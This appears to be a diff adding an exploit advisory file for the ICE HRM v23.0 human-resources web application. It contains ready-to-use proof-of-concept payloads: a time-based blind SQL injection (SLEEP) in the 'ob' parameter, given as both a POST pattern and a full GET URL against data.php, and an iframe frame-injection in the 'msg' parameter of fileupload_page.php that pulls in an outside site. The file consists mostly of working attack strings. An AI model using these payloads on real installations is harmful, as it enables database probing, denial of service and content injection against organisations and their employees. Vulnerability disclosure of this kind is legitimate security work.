@@ -1,0 +1,69 @@
+===========================================================================================
+# Exploit Title: ICE HRM - ’ob’ SQL Inj.
+# Dork: N/A
+# Date: 14-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://icehrm.org
+# Software Link: https://sourceforge.net/projects/icehrm/
+# Version: v23.0
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: ICE Hrm is a Human resource management system for
+small and medium sized organizations.
+  It has a rich UI built with PHP and Java Script.
+===========================================================================================
+# POC - SQLi (blind)
+# Parameters : ob
+# Attack Pattern :
+1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# POST Method : http://localhost/icehrmv23OS/app/service.php
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: ICE HRM - ’ob’ SQL Inj.
+# Dork: N/A
+# Date: 14-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://icehrm.org
+# Software Link: https://sourceforge.net/projects/icehrm/
+# Version: v23.0
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: ICE Hrm is a Human resource management system for
+small and medium sized organizations.
+  It has a rich UI built with PHP and Java Script.
+===========================================================================================
+# POC - SQLi (blind)
+# Parameters : ob
+# Attack Pattern :
+1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# GET Method :
+http://localhost/icehrmv23OS/app/data.php?t=Employee&sm=%7B%22nationality%22:[%22Nationality%22,%22id%22,%22name%22],%22ethnicity%22:[%22Ethnicity%22,%22id%22,%22name%22],%22immigration_status%22:[%22ImmigrationStatus%22,%22id%22,%22name%22],%22employment_status%22:[%22EmploymentStatus%22,%22id%22,%22name%22],%22job_title%22:[%22JobTitle%22,%22id%22,%22name%22],%22pay_grade%22:[%22PayGrade%22,%22id%22,%22name%22],%22country%22:[%22Country%22,%22code%22,%22name%22],%22province%22:[%22Province%22,%22id%22,%22name%22],%22department%22:[%22CompanyStructure%22,%22id%22,%22title%22],%22supervisor%22:[%22Employee%22,%22id%22,%22first_name%20last_name%22]%7D&cl=[%22id%22,%22image%22,%22employee_id%22,%22first_name%22,%22last_name%22,%22mobile_phone%22,%22department%22,%22gender%22,%22supervisor%22]&ft=%7B%22status%22:%22Active%22%7D&ob=1%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%22*%2f
+===========================================================================================
+
+===========================================================================================
+# Exploit Title: ICE HRM - ’msg’ Frame Inj.
+# Dork: N/A
+# Date: 14-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: http://icehrm.org
+# Software Link: https://sourceforge.net/projects/icehrm/
+# Version: v23.0
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: ICE Hrm is a Human resource management system for
+small and medium sized organizations.
+It has a rich UI built with PHP and Java Script.
+===========================================================================================
+# POC - Frame Inj.
+# Parameters : msg
+# Attack Pattern : %3ciframe+src%3d%22http%3a%2f%2fcyber-warrior.org
+%2f%3f%22%3e%3c%2fiframe%3e
+# GET Method :
+http://localhost/icehrmv23OS/app/fileupload_page.php?id=_id_&msg=<iframe
+src="http://cyber-warrior.org/
+?"></iframe>&file_group=_file_group_&file_type=_file_type_&user=_user_
+===========================================================================================
